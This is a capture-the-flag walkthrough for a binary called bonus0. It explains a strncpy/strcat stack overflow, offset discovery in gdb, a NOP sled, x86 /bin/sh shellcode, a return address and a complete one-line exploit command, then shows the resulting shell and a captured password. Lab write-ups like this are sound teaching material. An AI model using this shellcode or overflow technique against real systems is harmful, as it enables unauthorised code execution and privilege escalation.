# Bonus0

This walkthrough explains the `bonus0` → `bonus1` exploitation, step by step, with detailed explanations for every concept.

---

## 1. Program behavior

Running `./bonus0` asks for two inputs, separated by a space.  
The program concatenates them and prints the result:

```bash
$ ./bonus0
 -
Hey
 -
lesfi
Hey lesfi
```

---

## 2. Functions overview

Using `info functions` in gdb, we see three key functions:

- `main()`  
- `pp()`  
- `p()`  

Disassembly reveals:

- `main()` → calls `pp()`, then prints the buffer with `puts()`.
- `pp()` → calls `p()` twice (to read both inputs a and b), then concatenates them into the buffer.
- `p()` → reads up to 4096 characters into a large buffer (without always ensuring null termination) and then uses `strncpy()` to copy at most 20 chars into smaller buffers.

---

## 3. Vulnerability explanation

- The `p()` function reads into a **4096‑byte local buffer**.
- Then it copies **up to 20 bytes** into another buffer via `strncpy()`.
- If the source string is **20 bytes or longer**, the **\n is not replaced by \0**.
- The result: when both inputs are merged, the buffer can grow larger than expected.

If `arg1` is exactly 20 bytes (no `\0`), the concatenation can keep going. 
But because of how the program reuses buffers and concatenates again, the real size can reach **61 bytes** before hitting the vulnerable buffer of size **42 bytes**.
This leads to:

```
20 (arg1) + 1 (space) + up to 20 (arg2) = 41 bytes
but there's another user of strcat adding 20 bytes :
20 + 20 + 1 + 20 = 61 bytes
```
---

## 4. Finding the offset

To know where `EIP` is overwritten, we use a pattern:

```bash
$ ./bonus0
 -
01234567890123456789
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9...
```

Result in gdb:

```
EIP = 0x41336141
```

This corresponds to offset **9** inside the second argument.

---

## 5. Buffer address

In gdb, setting a breakpoint inside `p()`:

```gdb
b *p+28
run
x $ebp-0x1008
```

This shows the start of the large buffer, for example:

```
0xbfffe680
```

This is where our payload (NOPs + shellcode) will land.

---

## 6. NOP sled

- `NOP` = “No Operation” (`\x90` in x86).  
- Executing it does nothing; CPU just moves to the next instruction.  
- We use a **NOP sled** = a sequence of many NOPs before our shellcode.  

Why? Because if we jump *anywhere* inside the sled, execution will “slide” until it reaches the shellcode.  
This makes our jump address much more forgiving.

---

## 7. Shellcode

The shellcode used is:

```python
"\x31\xc0\x50\x68\x2f\x2f\x73\x68" +
"\x68\x2f\x62\x69\x6e\x89\xe3\x89" +
"\xc1\x89\xc2\xb0\x0b\xcd\x80\x31" +
"\xc0\x40\xcd\x80"
```

It does two things:

1. Spawn a shell (`/bin/sh`)  
2. Exit cleanly

In practice we prepend it with 100+ NOPs:

```bash
python -c 'print "\x90"*100 + "<shellcode>"'
```

---

## 8. Choosing the return address

We want `EIP` to point somewhere inside the NOP sled.  
Buffer start: `0xbfffe680`  
Offset start after args: +61  
So we can safely jump to around: `0xbfffe6d0`

---

## 9. Exploit construction

- **First argument** = NOP sled + shellcode  
- **Second argument** = padding to reach offset 9 + return address + filler

Example:

```bash
# First arg
python -c 'print "\x90"*100 + "<shellcode>"'

# Second arg
python -c 'print "A"*9 + "\xd0\xe6\xff\xbf" + "B"*7'
```

---

## 10. Final exploit

```bash
(python -c 'print "\x90"*100 + "<shellcode>"';  python -c 'print "A"*9 + "\xd0\xe6\xff\xbf" + "B"*7';  cat) | ./bonus0
```

Result:

```
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

---
